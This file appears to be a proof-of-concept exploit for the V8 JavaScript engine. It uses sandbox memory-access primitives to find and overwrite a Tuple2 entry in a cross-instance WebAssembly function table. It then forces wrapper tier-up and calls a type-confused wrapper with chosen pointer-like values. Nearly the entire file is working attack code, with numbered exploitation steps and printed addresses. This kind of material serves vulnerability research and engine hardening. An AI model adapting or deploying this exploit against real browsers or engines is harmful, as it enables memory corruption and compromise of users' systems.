d8.file.execute('test/mjsunit/wasm/wasm-module-builder.js');

const kGenericWrapperBudget = 1000;
const kWasmTableObjectEntriesOffset = 0xc;
const kFixedArrayEntry0Offset = 0x8;
const kTuple2Value2Offset = 0x8;
const kMapOffset = 0;
const kHeapObjectTag = 1;
const kSmiTagSize = 1;
let memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
function getPtr(obj) {
  return Sandbox.getAddressOf(obj) + kHeapObjectTag;
}
function getField(obj, offset) {
  return memory.getUint32(obj + offset - kHeapObjectTag, true);
}
function setField(obj, offset, value) {
  memory.setUint32(obj + offset - kHeapObjectTag, value, true);
}

function findObject(needle, start) {
  function match() {
    for (let k = 0; k < needle.length; ++k) {
      if (getField(start, k * 4) != needle[k]) return false;
    }
    return true;
  }
  while (!match()) start += 4;
  return start;
}

let {instance: exporter_instance, exports: {func_l_l}} = (()=>{
  const builder = new WasmModuleBuilder();
  let $sig_l_l = builder.addType(kSig_l_l);
  let $f = builder.addImport('import', 'func_l_l', $sig_l_l);
  builder.addExport('func_l_l', $f);
  let instance = builder.instantiate({import: {func_l_l: v=>v}});
  return {instance, exports: instance.exports};
})();

let builder = new WasmModuleBuilder();
let $s0 = builder.addStruct([makeField(kWasmI32, true)]);
let $sig_s0_l = builder.addType(makeSig([kWasmI64], [wasmRefType($s0)]));
let $sig_l_l = builder.addType(kSig_l_l);

let $f_exp = builder.addImport('import', 'func_exp', $sig_s0_l);
builder.addFunction('exp', makeSig([kWasmI64, kWasmI32], [])).addBody([
  kExprLocalGet, 0,
  kExprCallFunction, $f_exp,
  kExprLocalGet, 1,
  kGCPrefix, kExprStructSet, $s0, 0,
]).exportFunc();

let $dummy = builder.addFunction('dummy', $sig_l_l);
let $t = builder.addTable(wasmRefType($sig_l_l), 1, 1, [kExprRefFunc, $dummy.index]).exportAs('table');
$dummy.addBody([
  kExprLocalGet, 0,
  ...wasmI32Const(0),
  kExprCallIndirect, $sig_l_l, $t.index,
]).exportFunc();

let instance = builder.instantiate({import: {func_exp: v=>v}});
let {exp, dummy, table} = instance.exports;

// 1. dynamically resolve tuple2 map from function table placeholder
let table_ptr = getPtr(table);
let entries_ptr = getField(table_ptr, kWasmTableObjectEntriesOffset); 
let entry0_ptr = getField(entries_ptr, kFixedArrayEntry0Offset);
let tuple2_map_ptr = getField(entry0_ptr, kMapOffset);
console.log(`[+] Map(TUPLE2_TYPE): ${tuple2_map_ptr.toString(16)}`);

// 2. set cross-instance table indexing tuple2
table.set(0, func_l_l);

// 3. find the target tuple2
// both allocated at old space, address likely stable
let instance_ptr = getPtr(instance);
let needle = [tuple2_map_ptr, instance_ptr, (0 + 1) << kSmiTagSize];
let search_start = (entry0_ptr & ~(0x40000 - 1)) + kHeapObjectTag;
let cross_tuple2_ptr = findObject(needle, search_start);
console.log(`[+] cross-instance tuple2: ${cross_tuple2_ptr.toString(16)}`);

// 4. overwrite origin as an import index for func_exp
setField(cross_tuple2_ptr, kTuple2Value2Offset, (-$f_exp - 1) << kSmiTagSize);

// 5. trigger tier-up - $sig_l_l used as wrapper signature for cidx($sig_s0_l)
for (let i = 0; i < kGenericWrapperBudget; i++) {
  dummy(0n);
}

// 6. call the confused wrapper
exp(0x424242424242n - 7n, 0x41424344);
